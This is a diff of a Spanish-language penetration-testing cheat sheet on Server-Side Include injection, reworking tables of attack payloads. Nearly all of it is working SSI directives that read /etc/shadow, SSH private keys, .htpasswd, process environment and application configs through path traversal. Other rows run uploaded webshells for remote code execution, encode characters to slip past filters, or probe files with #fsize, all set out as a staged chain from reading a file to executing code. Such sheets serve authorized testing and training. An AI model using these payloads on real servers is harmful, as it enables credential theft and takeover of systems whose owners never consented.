@@ -22,39 +22,35 @@ linked:
 ## `#include virtual` (URL-Relative)
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| Include relative URL | `<!--#include virtual="/admin/config.php" -->` | Path relativo a webroot. |
-| Include other .shtml | `<!--#include virtual="/another.shtml" -->` | Recursive SSI. |
-| Include CGI script | `<!--#include virtual="/cgi-bin/test.cgi" -->` | Executes CGI + embeds output. |
-| Include with query string | `<!--#include virtual="/page.cgi?param=value" -->` | CGI con args. |
-| Include host-relative | `<!--#include virtual="//other.com/page" -->` | Cross-domain — depends. |
-| Path traversal | `<!--#include virtual="../../../../etc/passwd" -->` | Bypass webroot. |
-| Mixed traversal | `<!--#include virtual="/uploads/../../../etc/passwd" -->` | Same. |
-| Include uploaded file | `<!--#include virtual="/uploads/shell.shtml" -->` | RCE chain via upload. |
-| Include PHP | `<!--#include virtual="/uploads/shell.php" -->` | If PHP handler co-exists. |
-| Include con encoding | `%2F` for `/` | Encoding bypass. |
-| Triggers handlers | virtual respects URL handlers (PHP, CGI, etc) | Standard. |
-| Respects ACLs | virtual go through web auth layer | Limitation. |
+|---|---|---|
+| `<!--#include virtual="/admin/config.php" -->` | Contenido del recurso (ejecutado si hay handler) | Path relativo al webroot |
+| `<!--#include virtual="/another.shtml" -->` | SSI recursivo (parsea el incluido) | Encadenar SSI |
+| `<!--#include virtual="/cgi-bin/test.cgi" -->` | Ejecuta el CGI y embebe su salida | Pivot a RCE vía CGI |
+| `<!--#include virtual="/page.cgi?param=value" -->` | CGI con argumentos | Pasar params al CGI |
+| `<!--#include virtual="../../../../etc/passwd" -->` | Lectura fuera del webroot | Path traversal |
+| `<!--#include virtual="/uploads/shell.shtml" -->` | Ejecuta el SSI subido | Cadena RCE vía upload |
+| `<!--#include virtual="/uploads/shell.php" -->` | Ejecuta el PHP subido | Si co-existe handler PHP |
+
 ^ssi-include-virtual
+
+> [!note] `virtual` pasa por los handlers de URL (PHP/CGI se ejecutan) y respeta auth/ACLs, pero cuesta escapar del webroot. Encodear `/` como `%2F` puede saltear filtros simples.
 
 ---
 
 ## `#include file` (Filesystem-Relative)
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| Read file absolute path | `<!--#include file="/etc/passwd" -->` | Direct file read. |
-| Read shadow (root only) | `<!--#include file="/etc/shadow" -->` | Permissions matter. |
-| Read app config | `<!--#include file="/var/www/html/config.php" -->` | Source disclosure. |
-| Read SSH keys | `<!--#include file="/home/user/.ssh/id_rsa" -->` | If readable. |
-| Read environ | `<!--#include file="/proc/self/environ" -->` | Process env. |
-| Path traversal | `<!--#include file="../../etc/passwd" -->` | Relative traversal. |
-| Read Apache config | `<!--#include file="/etc/apache2/apache2.conf" -->` | Server config. |
-| Read .htpasswd | `<!--#include file="/etc/apache2/.htpasswd" -->` | Auth credentials. |
-| Read backup files | `<!--#include file="/var/www/html/index.php.bak" -->` | Source disclosure. |
-| Raw content (no handler) | `file=` returns raw, no PHP/CGI execution | Standard. |
-| Symlink follow restrictions | Apache may restrict symlinks | Per-config. |
-| Tomcat / IIS variants | Different file syntax | Per-server. |
+|---|---|---|
+| `<!--#include file="/etc/passwd" -->` | Usuarios del sistema (crudo) | Lectura directa |
+| `<!--#include file="/etc/shadow" -->` | Hashes de contraseñas | Si corre como root |
+| `<!--#include file="/var/www/html/config.php" -->` | Source del config SIN ejecutar | Source disclosure |
+| `<!--#include file="/home/user/.ssh/id_rsa" -->` | Clave SSH privada | Si es legible |
+| `<!--#include file="/proc/self/environ" -->` | Variables de entorno del proceso | Env del webserver |
+| `<!--#include file="../../etc/passwd" -->` | Lectura por traversal relativo | Escapar el dir actual |
+| `<!--#include file="/etc/apache2/apache2.conf" -->` | Config de Apache | Mapear el server |
+| `<!--#include file="/etc/apache2/.htpasswd" -->` | Credenciales de Basic Auth | Si es legible |
+| `<!--#include file="/var/www/html/index.php.bak" -->` | Source de un backup | Source disclosure |
+
 ^ssi-include-file
 
 ### Diferencias `virtual` vs `file`
@@ -77,22 +73,14 @@ file=          Filesystem-relative
 ## LFI Chain via SSI
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| Stage 1: Source disclosure | `<!--#include file="/var/www/index.php" -->` | Read PHP source. |
-| Stage 2: Identify creds | Read app config con DB password | Standard. |
-| Stage 3: Access DB | Use creds | Lateral. |
-| Stage 4: Upload webshell | If file upload + LFI exists | RCE chain. |
-| Stage 5: Include uploaded shell | `<!--#include virtual="/uploads/shell.php" -->` | Trigger PHP. |
-| LFI to RCE flow | Standard pattern adjacent | Standard. |
-| Read backup files | `index.php.bak`, `config.bak` | Common patterns. |
-| Read git internals | `/.git/config`, `/.git/HEAD` | Source disclosure. |
-| Read /proc | `/proc/self/cmdline`, `/proc/self/environ` | Process info. |
-| Combine con php://filter | If PHP wrapper available | Edge. |
-| `+IncludesNOEXEC` fallback | Use `#include` instead of `#exec` | Standard. |
-| Combine con file upload XSS | Stored payload via upload | Multi-vector. |
-| Existence check via `#fsize` | Probe file existence sin reveal contents | Recon. |
-| Combine con cookie / header | Inject SSI via reflected header | Stealth. |
-| Combine con upload | Upload .shtml con malicious SSI | Stored exec. |
+|---|---|---|
+| `<!--#include file="/var/www/html/admin.php" -->` | Source con creds de DB / endpoints internos | Stage 1: source disclosure |
+| `<!--#include file="/home/devuser/.ssh/id_rsa" -->` | Clave SSH para acceso directo | Stage 2: si es legible |
+| `<!--#include virtual="/uploads/shell.php" -->` | Dispara la webshell subida (PHP) | Stage 5: RCE tras upload |
+| `<!--#include file="/.git/config" -->` | Internals de git (remotes/creds) | Source disclosure |
+| `<!--#include file="/proc/self/cmdline" -->` | Línea de comando del proceso | Recon del proceso |
+| `<!--#fsize file="/etc/passwd" -->` | Existencia/tamaño SIN leer contenido | Probe cuando `#include` está bloqueado |
+
 ^ssi-include-lfi-chain
 
 ### Workflow LFI to RCE chain
